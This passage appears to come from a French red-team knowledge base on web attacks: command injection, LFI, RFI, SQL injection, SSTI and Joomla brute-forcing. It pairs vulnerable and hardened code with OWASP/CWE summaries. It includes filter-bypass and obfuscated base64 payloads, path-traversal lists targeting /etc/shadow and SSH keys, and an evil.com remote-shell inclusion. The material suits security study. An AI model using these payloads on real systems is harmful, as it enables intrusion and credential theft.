:</p> <pre><code>use Symfony\\Component\\Process\\Process; \nuse Symfony\\Component\\Process\\Exception\\ProcessFailedException; \n\n$process = new Process(['nslookup', $domain]); \n$process-&gt;run(); \n\nif (!$process-&gt;isSuccessful()) { \nthrow new ProcessFailedException($process); \n} \n\necho $process-&gt;getOutput();\n</code></pre> <p>Echappement Appropri\u00e9 :</p> <pre><code>$domain = escapeshellarg($_GET['domain']); \n$output = shell_exec(\"nslookup \" . $domain); \necho htmlspecialchars($output, ENT_QUOTES, 'UTF-8');\n</code></pre> Cat\u00e9gorie Information TTP Injection de commandes syst\u00e8me ou de shell dans une application CWE CWE-77 (Command Injection) Description de l'attaque L'injection de commandes se produit lorsqu'un attaquant ins\u00e8re ou injecte une commande dans une application, qui est ensuite ex\u00e9cut\u00e9e par le syst\u00e8me d'exploitation. Cela peut permettre l'ex\u00e9cution de commandes arbitraires sur le serveur. Impacts potentiels - Ex\u00e9cution de commandes arbitraires- Compromission du serveur- Acc\u00e8s non autoris\u00e9 aux syst\u00e8mes et donn\u00e9es Comment la d\u00e9tecter - Analyse des journaux d'applications pour des commandes suspectes- Utilisation de scanners de vuln\u00e9rabilit\u00e9s- Tests de p\u00e9n\u00e9tration ciblant l'ex\u00e9cution de commandes Rem\u00e9diations/mitigations - Validation et \u00e9chappement des entr\u00e9es utilisateur- Utilisation de listes blanches pour les commandes autoris\u00e9es- Ex\u00e9cution des processus avec des privil\u00e8ges limit\u00e9s- Formation des d\u00e9veloppeurs aux pratiques de codage s\u00e9curis\u00e9 Lien de r\u00e9f\u00e9rence OWASP - Command Injection"},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/Payloads/","title":"Payloads","text":"<pre><code>ping 127.0.0.1; whoami\nping -c 1 127.0.0.1 &amp;&amp; whoami\nping -c 1 127.0.0.1 || whoami\n127.0.0.1%0a whoami\n127.0.0.1%0a{ls,-la}\nw\"h\"o\"am\"i\nwho$@ami\nw\\ho\\am\\i\nwho^ami\nWhOaMi\n$(tr \"[A-Z]\" \"[a-z]\"&lt;&lt;&lt;\"WhOaMi\")\n$(rev&lt;&lt;&lt;'imaohw')\nbash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)\n</code></pre> <p>https://github.com/Bashfuscator/Bashfuscator</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/Payloads/#injection-operators","title":"Injection Operators","text":"Injection Operator Injection Character URL-Encoded Character Executed Command Semicolon <code>;</code> <code>%3b</code> Both New Line <code>\\n</code> <code>%0a</code> Both Background <code>&amp;</code> <code>%26</code> Both (second output generally shown first) Pipe <code>\\|</code> <code>%7c</code> Both (only second output is shown) AND <code>&amp;&amp;</code> <code>%26%26</code> Both (only if first succeeds) OR <code>\\|\\|</code> <code>%7c%7c</code> Second (only if first fails) Sub-Shell <code>``</code> <code>%60%60</code> Both (Linux-only) Sub-Shell <code>$()</code> <code>%24%28%29</code> Both (Linux-only)"},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/Payloads/#linux","title":"Linux","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/Payloads/#filtered-character-bypass","title":"Filtered Character Bypass","text":"Code Description <code>printenv</code> Can be used to view all environment variables Spaces <code>%09</code> Using tabs instead of spaces <code>${IFS}</code> Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. <code>$()</code>) <code>{ls,-la}</code> Commas will be replaced with spaces Other Characters <code>${PATH:0:1}</code> Will be replaced with <code>/</code> <code>${LS_COLORS:10:1}</code> Will be replaced with <code>;</code> <code>$(tr '!-}' '\"-~'&lt;&lt;&lt;[)</code> Shift character by one (<code>[</code> -&gt; <code>\\</code>)"},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/Payloads/#blacklisted-command-bypass","title":"Blacklisted Command Bypass","text":"Code Description Character Insertion <code>'</code> or <code>\"</code> Total must be even <code>$@</code> or <code>\\</code> Linux only Case Manipulation <code>$(tr \"[A-Z]\" \"[a-z]\"&lt;&lt;&lt;\"WhOaMi\")</code> Execute command regardless of cases <code>$(a=\"WhOaMi\";printf %s \"${a,,}\")</code> Another variation of the technique Reversed Commands <code>echo 'whoami' \\| rev</code> Reverse a string <code>$(rev&lt;&lt;&lt;'imaohw')</code> Execute reversed command Encoded Commands <code>echo -n 'cat /etc/passwd \\| grep 33' \\| base64</code> Encode a string with base64 <code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code> Execute b64 encoded string"},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/Payloads/#windows","title":"Windows","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/Payloads/#filtered-character-bypass_1","title":"Filtered Character Bypass","text":"Code Description <code>Get-ChildItem Env:</code> Can be used to view all environment variables - (PowerShell) Spaces <code>%09</code> Using tabs instead of spaces <code>%PROGRAMFILES:~10,-5%</code> Will be replaced with a space - (CMD) <code>$env:PROGRAMFILES[10]</code> Will be replaced with a space - (PowerShell) Other Characters <code>%HOMEPATH:~0,-17%</code> Will be replaced with <code>\\</code> - (CMD) <code>$env:HOMEPATH[0]</code> Will be replaced with <code>\\</code> - (PowerShell)"},{"location":"Red%20Team/2%20-%20Services/HTTP/Injection%20de%20commande/Payloads/#blacklisted-command-bypass_1","title":"Blacklisted Command Bypass","text":"Code Description Character Insertion <code>'</code> or <code>\"</code> Total must be even <code>^</code> Windows only (CMD) Case Manipulation <code>WhoAmi</code> Simply send the character with odd cases Reversed Commands <code>\"whoami\"[-1..-20] -join ''</code> Reverse a string <code>iex \"$('imaohw'[-1..-20] -join '')\"</code> Execute reversed command Encoded Commands <code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code> Encode a string with base64 <code>iex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\"</code> Execute b64 encoded string"},{"location":"Red%20Team/2%20-%20Services/HTTP/Joomla/Bruteforce%20panel%20administration/","title":"Bruteforce panel administration","text":"<pre><code>python3 joomla-brute.py -u http://$url -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/Joomla/Enum%C3%A9ration/","title":"Enum\u00e9ration","text":"<p>Enum\u00e9ration:</p> <pre><code>sudo pip3 install droopescan\n</code></pre> <pre><code>droopescan scan joomla --url http://dev.inlanefreight.local/\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/LFI/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/LFI/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles d'inclusion de fichiers locaux (LFI) se produisent lorsqu'une application web inclut des fichiers locaux sans validation ad\u00e9quate des entr\u00e9es utilisateur. Cela permet \u00e0 un attaquant d'inclure des fichiers arbitraires du serveur dans l'application, pouvant entra\u00eener la divulgation de fichiers sensibles, l'ex\u00e9cution de code malveillant, et d'autres cons\u00e9quences graves.</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/LFI/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-lfi","title":"Exemple d'Attaque LFI","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Une application web inclut dynamiquement un fichier en fonction des param\u00e8tres fournis par l'utilisateur via une URL, par exemple <code>https://example.com/index.php?page=home</code>.</li> </ul> <p>Exemple de code vuln\u00e9rable :</p> <pre><code>&lt;?php \n$page = $_GET['page']; \ninclude($page . \".php\"); \n?&gt;\n</code></pre> <p>Exploitation :</p> <ul> <li>Un attaquant peut manipuler le param\u00e8tre <code>page</code> pour inclure des fichiers sensibles ou des fichiers de configuration, par exemple <code>https://example.com/index.php?page=../../../../etc/passwd</code>.</li> </ul> <pre><code>GET /index.php?page=../../../../etc/passwd HTTP/1.1 \nHost: example.com\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/LFI/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-lfi","title":"Pr\u00e9vention des Attaques LFI","text":"<p>Validation et Sanitation des Entr\u00e9es :</p> <ul> <li>Valider et assainir toutes les entr\u00e9es utilisateur pour s'assurer qu'elles ne contiennent pas de caract\u00e8res sp\u00e9ciaux ou de chemins relatifs.</li> </ul> <pre><code>$whitelist = ['home', 'about', 'contact']; \n$page = $_GET['page']; \nif (!in_array($page, $whitelist)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude($page . \".php\");\n</code></pre> <p>Utilisation de Chemins Absolus :</p> <ul> <li>Utiliser des chemins absolus pour les fichiers inclus afin d'emp\u00eacher les manipulations de chemins relatifs.</li> </ul> <pre><code>$page = basename($_GET['page']); \ninclude(\"/var/www/html/pages/\" . $page . \".php\");\n</code></pre> <p>Configuration du Serveur :</p> <ul> <li>Configurer le serveur pour restreindre l'acc\u00e8s aux fichiers critiques et sensibles.</li> </ul> <pre><code># Exemple de configuration Apache \n&lt;Directory /var/www/html&gt; \nOptions -Indexes \nAllowOverride None \n&lt;/Directory&gt;\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/LFI/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-lfi","title":"D\u00e9tection des Failles LFI","text":"<p>Revue de Code :</p> <ul> <li>Examiner le code source pour identifier les inclusions de fichiers bas\u00e9es sur des entr\u00e9es utilisateur sans validation ad\u00e9quate.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en manipulant les param\u00e8tres de requ\u00eates pour inclure des fichiers arbitraires et v\u00e9rifier la pr\u00e9sence de vuln\u00e9rabilit\u00e9s.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles LFI.</li> </ul>"},{"location":"Red%20Team/2%20-%20Services/HTTP/LFI/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>Validation stricte des Entr\u00e9es :</p> <pre><code>$allowed_pages = ['home', 'about', 'contact']; \n$page = $_GET['page']; \nif (!in_array($page, $allowed_pages)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude($page . \".php\");\n</code></pre> <p>Utilisation de Fonctions S\u00e9curis\u00e9es :</p> <pre><code>$page = filter_input(INPUT_GET, 'page', FILTER_SANITIZE_STRING); \n$allowed_pages = ['home', 'about', 'contact']; \nif (!in_array($page, $allowed_pages)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude(__DIR__ . \"/pages/\" . $page . \".php\");\n</code></pre> <p>Contr\u00f4le des Chemins :</p> <pre><code>$page = realpath(__DIR__ . \"/pages/\" . $_GET['page'] . \".php\"); \n$base_dir = realpath(__DIR__ . \"/pages/\"); \nif (strpos($page, $base_dir) !== 0 || !file_exists($page)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude($page);\n</code></pre> Cat\u00e9gorie Information TTP Technique d'injection de fichier local CWE CWE-98 (Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')) Description de l'attaque LFI permet \u00e0 un attaquant d'inclure des fichiers sur un serveur via le navigateur web. Cela se produit souvent lorsque les pages utilisent une entr\u00e9e non valid\u00e9e pour charger des fichiers dynamiquement. Impacts potentiels - Divulgation d'informations sensibles- Ex\u00e9cution de code \u00e0 distance- Compromission du serveur web Comment la d\u00e9tecter - Analyse des journaux de serveur web pour les chemins de fichiers suspects- Utilisation de scanners de vuln\u00e9rabilit\u00e9s- Audits de code pour les inclusions de fichiers non s\u00e9curis\u00e9es Rem\u00e9diations/mitigations - Validation stricte des entr\u00e9es utilisateur- Utilisation de la liste blanche pour les chemins de fichiers- Mise \u00e0 jour et s\u00e9curisation des scripts PHP- D\u00e9sactivation de la directive <code>allow_url_include</code> dans PHP Lien de r\u00e9f\u00e9rence OWASP - Local File Inclusion"},{"location":"Red%20Team/2%20-%20Services/HTTP/LFI/Payloads/","title":"Payloads","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/LFI/Payloads/#techniques-de-base","title":"Techniques de base:","text":"<p><code>=/etc/passwd</code></p> <p><code>=../../../../../../etc/passwd</code></p> <p><code>=....//....//....//....//....//....//....//etc/passwd</code></p> <p><code>=....////....////....////....////....////etc/passwd</code></p> <p><code>=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd (url encode)</code></p> <p><code>=/gallery/../../../../../../../etc/passwd (en cas d'obligation de la pr\u00e9sence d'un chemin approuv\u00e9 dans l'url)</code></p> <p><code>=../../../../etc/passwd%00 (null byte)</code></p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/LFI/Payloads/#php-filters","title":"PHP filters:","text":"<pre><code>php://filter/read=convert.base64-encode/resource=../../../etc/passwd\n</code></pre> <p>Fichiers int\u00e9ressants \u00e0 lire :</p> <pre><code>/etc/passwd\n/proc/$PID/cmdline (g\u00e9n\u00e9rer une wordlist avec des chiffres de 1 \u00e0 1000)\n/etc/shadow\n/home/$user/.ssh/id_rsa\n/var/www/html/fichierdeconfig.php\n/var/www/html/LesDiff\u00e9rentesPages // permet de voir le code source \u00e9ventuellement)\n</code></pre> Function Read Content Execute Remote URL PHP <code>include()</code>/<code>include_once()</code> \u2705 \u2705 \u2705 <code>require()</code>/<code>require_once()</code> \u2705 \u2705 \u274c <code>file_get_contents()</code> \u2705 \u274c \u2705 <code>fopen()</code>/<code>file()</code> \u2705 \u274c \u274c NodeJS <code>fs.readFile()</code> \u2705 \u274c \u274c <code>fs.sendFile()</code> \u2705 \u274c \u274c <code>res.render()</code> \u2705 \u2705 \u274c Java <code>include</code> \u2705 \u274c \u274c <code>import</code> \u2705 \u2705 \u2705 .NET <code>@Html.Partial()</code> \u2705 \u274c \u274c <code>@Html.RemotePartial()</code> \u2705 \u274c \u2705 <code>Response.WriteFile()</code> \u2705 \u274c \u274c <code>include</code> \u2705 \u2705 \u2705"},{"location":"Red%20Team/2%20-%20Services/HTTP/RFI/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/RFI/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles d'inclusion de fichiers distants (RFI) se produisent lorsqu'une application web inclut des fichiers distants via une URL sans validation ad\u00e9quate des entr\u00e9es utilisateur. Cela permet \u00e0 un attaquant d'injecter des scripts malveillants h\u00e9berg\u00e9s sur des serveurs externes, conduisant \u00e0 la compromission du syst\u00e8me, \u00e0 la divulgation de donn\u00e9es sensibles, et \u00e0 d'autres cons\u00e9quences graves.</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/RFI/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-rfi","title":"Exemple d'Attaque RFI","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Une application web inclut dynamiquement un fichier bas\u00e9 sur les param\u00e8tres fournis par l'utilisateur via une URL, par exemple <code>https://example.com/index.php?page=home</code>.</li> </ul> <p>Exemple de code vuln\u00e9rable :</p> <pre><code>&lt;?php \n$page = $_GET['page']; \ninclude($page . \".php\"); \n?&gt;\n</code></pre> <p>Exploitation :</p> <ul> <li>Un attaquant peut manipuler le param\u00e8tre <code>page</code> pour inclure un fichier distant malveillant, par exemple <code>https://example.com/index.php?page=http://evil.com/shell</code>.</li> </ul> <pre><code>GET /index.php?page=http://evil.com/shell HTTP/1.1 \nHost: example.com\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/RFI/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-rfi","title":"Pr\u00e9vention des Attaques RFI","text":"<p>D\u00e9sactiver l'Inclusion de Fichiers Distants :</p> <ul> <li>D\u00e9sactiver l'option <code>allow_url_include</code> dans le fichier de configuration PHP (<code>php.ini</code>).</li> </ul> <pre><code>; D\u00e9sactiver l'inclusion de fichiers distants \nallow_url_include = Off\n</code></pre> <p>Validation et Sanitisation des Entr\u00e9es :</p> <ul> <li>Valider et assainir toutes les entr\u00e9es utilisateur pour s'assurer qu'elles ne contiennent pas de caract\u00e8res sp\u00e9ciaux ou d'URL.</li> </ul> <pre><code>$whitelist = ['home', 'about', 'contact']; \n$page = $_GET['page']; \nif (!in_array($page, $whitelist)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude($page . \".php\");\n</code></pre> <p>Utilisation de Chemins Absolus :</p> <ul> <li>Utiliser des chemins absolus pour les fichiers inclus afin d'emp\u00eacher les manipulations de chemins relatifs ou d'URL.</li> </ul> <pre><code>$page = basename($_GET['page']); \ninclude(\"/var/www/html/pages/\" . $page . \".php\");\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/RFI/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-rfi","title":"D\u00e9tection des Failles RFI","text":"<p>Revue de Code :</p> <ul> <li>Examiner le code source pour identifier les inclusions de fichiers bas\u00e9es sur des entr\u00e9es utilisateur sans validation ad\u00e9quate.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en manipulant les param\u00e8tres de requ\u00eates pour inclure des fichiers distants et v\u00e9rifier la pr\u00e9sence de vuln\u00e9rabilit\u00e9s.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que Burp Suite, OWASP ZAP, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles RFI.</li> </ul>"},{"location":"Red%20Team/2%20-%20Services/HTTP/RFI/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>Validation stricte des Entr\u00e9es :</p> <pre><code>$allowed_pages = ['home', 'about', 'contact']; \n$page = $_GET['page']; \nif (!in_array($page, $allowed_pages)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude($page . \".php\");\n</code></pre> <p>Utilisation de Fonctions S\u00e9curis\u00e9es :</p> <pre><code>$page = filter_input(INPUT_GET, 'page', FILTER_SANITIZE_STRING); \n$allowed_pages = ['home', 'about', 'contact']; \nif (!in_array($page, $allowed_pages)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude(__DIR__ . \"/pages/\" . $page . \".php\");\n</code></pre> <p>Contr\u00f4le des Chemins :</p> <pre><code>$page = realpath(__DIR__ . \"/pages/\" . $_GET['page'] . \".php\"); \n$base_dir = realpath(__DIR__ . \"/pages/\"); \nif (strpos($page, $base_dir) !== 0 || !file_exists($page)) { \ndie(\"Page non autoris\u00e9e.\"); \n} \ninclude($page);\n</code></pre> Cat\u00e9gorie Information TTP Technique d'inclusion de fichier distant CWE CWE-94 (Improper Control of Generation of Code ('Code Injection')) Description de l'attaque RFI permet \u00e0 un attaquant d'inclure des fichiers distants, g\u00e9n\u00e9ralement des scripts, dans une application web. Cela se fait en exploitant des vuln\u00e9rabilit\u00e9s dans les applications web qui ne valident pas correctement les entr\u00e9es utilisateur utilis\u00e9es pour inclure des fichiers. Impacts potentiels - Ex\u00e9cution de code malveillant \u00e0 distance- Compromission du serveur web- Acc\u00e8s non autoris\u00e9 aux donn\u00e9es Comment la d\u00e9tecter - Surveillance des journaux de serveur web pour les URL externes suspectes- Scans de s\u00e9curit\u00e9 et tests de p\u00e9n\u00e9tration- Audits de code pour identifier les points d'entr\u00e9e vuln\u00e9rables Rem\u00e9diations/mitigations - Validation stricte des entr\u00e9es utilisateur- Utilisation de la liste blanche pour les URL autoris\u00e9es- Configuration s\u00e9curis\u00e9e des serveurs et des interpr\u00e9teurs de scripts- D\u00e9sactivation des inclusions de fichiers distants dans la configuration du serveur (par exemple, <code>allow_url_include</code> dans PHP) Lien de r\u00e9f\u00e9rence OWASP - Remote File Inclusion"},{"location":"Red%20Team/2%20-%20Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/#failles-dinjection-sql-sql-injection","title":"Failles d'Injection SQL (SQL Injection)","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles d'injection SQL se produisent lorsque des entr\u00e9es utilisateur sont directement incluses dans des requ\u00eates SQL sans validation ou \u00e9chappement ad\u00e9quat. Cela permet \u00e0 un attaquant de manipuler les requ\u00eates SQL ex\u00e9cut\u00e9es par l'application, pouvant conduire \u00e0 la divulgation de donn\u00e9es sensibles, \u00e0 la modification de donn\u00e9es, \u00e0 l'ex\u00e9cution de commandes administratives sur la base de donn\u00e9es, et \u00e0 d'autres cons\u00e9quences graves.</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-sql-injection","title":"Exemple d'Attaque SQL Injection","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Une application web accepte des entr\u00e9es utilisateur et les utilise directement dans une requ\u00eate SQL, par exemple une page de connexion qui v\u00e9rifie les identifiants des utilisateurs.</li> </ul> <p>Exemple de code vuln\u00e9rable :</p> <pre><code>&lt;?php\n$username = $_POST['username'];\n$password = $_POST['password'];\n$query = \"SELECT * FROM users WHERE username = '$username' AND password = '$password'\";\n$result = mysqli_query($conn, $query);\n?&gt;\n</code></pre> <p>Exploitation :</p> <ul> <li>Un attaquant peut manipuler les entr\u00e9es pour alt\u00e9rer la requ\u00eate SQL, par exemple en entrant <code>' OR '1'='1</code> comme nom d'utilisateur ou mot de passe.</li> </ul> <pre><code>SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-sql-injection","title":"Pr\u00e9vention des Attaques SQL Injection","text":"<p>Utilisation de Requ\u00eates Pr\u00e9par\u00e9es :</p> <ul> <li>Utiliser des requ\u00eates pr\u00e9par\u00e9es avec des param\u00e8tres li\u00e9s pour emp\u00eacher l'injection SQL.</li> </ul> <pre><code>$stmt = $conn-&gt;prepare(\"SELECT * FROM users WHERE username = ? AND password = ?\");\n$stmt-&gt;bind_param(\"ss\", $username, $password);\nsstmt-&gt;execute();\n</code></pre> <p>\u00c9chappement des Entr\u00e9es Utilisateur :</p> <ul> <li>\u00c9chapper correctement toutes les entr\u00e9es utilisateur avant de les inclure dans des requ\u00eates SQL.</li> </ul> <pre><code>$username = mysqli_real_escape_string($conn, $_POST['username']);\n$password = mysqli_real_escape_string($conn, $_POST['password']);\n$query = \"SELECT * FROM users WHERE username = '$username' AND password = '$password'\";\n$result = mysqli_query($conn, $query);\n</code></pre> <p>Utilisation d'ORMs :</p> <ul> <li>Utiliser des Object-Relational Mappers (ORMs) qui abstraient les requ\u00eates SQL et fournissent des m\u00e9canismes de protection contre les injections SQL.</li> </ul> <pre><code>$user = User::where('username', $username)-&gt;where('password', $password)-&gt;first();\n</code></pre>"},{"location":"Red%20Team/2%20-%20Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/#detection-des-failles-sql-injection","title":"D\u00e9tection des Failles SQL Injection","text":"<p>Revue de Code :</p> <ul> <li>Examiner le code source pour identifier les endroits o\u00f9 des entr\u00e9es utilisateur sont directement incluses dans des requ\u00eates SQL sans validation ou \u00e9chappement ad\u00e9quat.</li> </ul> <p>Tests Manuels :</p> <ul> <li>Effectuer des tests manuels en manipulant les param\u00e8tres de requ\u00eates pour v\u00e9rifier la pr\u00e9sence de vuln\u00e9rabilit\u00e9s d'injection SQL.</li> </ul> <p>Utilisation d'Outils de S\u00e9curit\u00e9 :</p> <ul> <li>Utiliser des outils de s\u00e9curit\u00e9 tels que SQLMap, Burp Suite, ou des scanners sp\u00e9cifiques pour d\u00e9tecter les failles d'injection SQL.</li> </ul>"},{"location":"Red%20Team/2%20-%20Services/HTTP/SQL%20injection/G%C3%A9n%C3%A9ralit%C3%A9s/#exemples-de-prevention","title":"Exemples de Pr\u00e9vention","text":"<p>Requ\u00eates Pr\u00e9par\u00e9es :</p> <pre><code>$stmt = $conn-&gt;prepare(\"SELECT * FROM users WHERE username = ? AND password = ?\");\n$stmt-&gt;bind_param(\"ss\", $username, $password);\n$stmt-&gt;execute();\n</code></pre> <p>Utilisation de PDO :</p> <pre><code>$stmt = $pdo-&gt;prepare(\"SELECT * FROM users WHERE username = :username AND password = :password\");\n$stmt-&gt;execute(['username' =&gt; $username, 'password' =&gt; $password]);\n</code></pre> <p>Validation et Sanitation des Entr\u00e9es :</p> <pre><code>$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);\n$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);\n$stmt = $conn-&gt;prepare(\"SELECT * FROM users WHERE username = ? AND password = ?\");\n$stmt-&gt;bind_param(\"ss\", $username, $password);\n$stmt-&gt;execute();\n</code></pre> Cat\u00e9gorie Information TTP Technique d'injection de code SQL dans les requ\u00eates de base de donn\u00e9es CWE CWE-89 (Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')) Description de l'attaque L'injection SQL se produit lorsqu'un attaquant ins\u00e8re ou \"injecte\" une requ\u00eate SQL malveillante via les donn\u00e9es d'entr\u00e9e d'une application. Cela peut permettre \u00e0 l'attaquant de lire, modifier, ou supprimer des donn\u00e9es dans la base de donn\u00e9es. Impacts potentiels - Fuite de donn\u00e9es confidentielles- Perte d'int\u00e9grit\u00e9 des donn\u00e9es- Prise de contr\u00f4le de la base de donn\u00e9es Comment la d\u00e9tecter - Analyse des journaux d'applications pour des requ\u00eates SQL suspectes- Utilisation de syst\u00e8mes de d\u00e9tection d'intrusion- Tests de p\u00e9n\u00e9tration et scans de vuln\u00e9rabilit\u00e9 Rem\u00e9diations/mitigations - Utilisation de requ\u00eates pr\u00e9par\u00e9es (PreparedStatement) et ORM- Validation et \u00e9chappement des entr\u00e9es utilisateur- Mise en \u0153uvre de listes blanches pour les entr\u00e9es utilisateur- Formation des d\u00e9veloppeurs aux pratiques s\u00e9curis\u00e9es de codage Lien de r\u00e9f\u00e9rence OWASP - SQL Injection"},{"location":"Red%20Team/2%20-%20Services/HTTP/SSTI/G%C3%A9n%C3%A9ralit%C3%A9s/","title":"G\u00e9n\u00e9ralit\u00e9s","text":""},{"location":"Red%20Team/2%20-%20Services/HTTP/SSTI/G%C3%A9n%C3%A9ralit%C3%A9s/#description","title":"Description","text":"<p>Les failles d'injection de mod\u00e8les c\u00f4t\u00e9 serveur (SSTI) se produisent lorsque les entr\u00e9es utilisateur sont directement int\u00e9gr\u00e9es dans des templates sans validation ou \u00e9chappement ad\u00e9quat. Cela permet \u00e0 un attaquant d'injecter du code malveillant qui sera ex\u00e9cut\u00e9 sur le serveur, conduisant \u00e0 des compromissions de s\u00e9curit\u00e9 graves, y compris l'ex\u00e9cution de commandes arbitraires et la divulgation de donn\u00e9es sensibles.</p>"},{"location":"Red%20Team/2%20-%20Services/HTTP/SSTI/G%C3%A9n%C3%A9ralit%C3%A9s/#exemple-dattaque-ssti","title":"Exemple d'Attaque SSTI","text":"<p>Sc\u00e9nario d'attaque :</p> <ul> <li>Une application web utilise un moteur de template pour g\u00e9n\u00e9rer dynamiquement du contenu bas\u00e9 sur les entr\u00e9es utilisateur, par exemple, un moteur de template Jinja2 dans une application Flask.</li> </ul> <p>Exemple de code vuln\u00e9rable :</p> <pre><code>from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/greet', methods=['POST'])\ndef greet():\n    name = request.form['name']\n    template = f\"Hello {name}!\"\n    return render_template_string(template)\n</code></pre> <p>Exploitation :    - Un attaquant peut manipuler les entr\u00e9es pour injecter du code malveillant dans le template, par exemple en entrant <code>{{ 7*7 }}</code> comme nom.</p> <pre><code>POST /greet HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\n\nname={{ 7*7 }}\n</code></pre> <ul> <li>Le template rendu afficherait alors <code>Hello 49!</code>, indiquant que le code a \u00e9t\u00e9 ex\u00e9cut\u00e9.</li> </ul>"},{"location":"Red%20Team/2%20-%20Services/HTTP/SSTI/G%C3%A9n%C3%A9ralit%C3%A9s/#prevention-des-attaques-ssti","title":"Pr\u00e9vention des Attaques SSTI","text":"<p>\u00c9chappement des Entr\u00e9es Utilisateur :</p> <ul> <li>Utiliser des fonctions d'\u00e9chappement fournies par le moteur de template pour s'assurer que les entr\u00e9es utilisateur sont trait\u00e9es comme du texte brut.</li> </ul> <pre><code>from flask import escape\n\n@app.route('/greet', methods=['POST'])\ndef greet():\n    name = escape(request.form['name'])\n    template = f\"Hello {name}!\"\n    return render_template_string(template)\n</code></pre> <p>Utilisation de Templates S\u00e9curis\u00e9s :</p> <ul> <li>Utiliser des m\u00e9thodes s\u00e9curis\u00e9es pour rendre les templates qui ne permettent pas l'injection de code.</li> </ul> <pre><code>@app.route('/greet', methods=['POST'])\ndef greet():\n    name = request.form['name']\n    return render_template('greet.html', name=name)\n</code></pre> <p>Validation et Sanitation des Entr\u00e9es :</p> <ul> 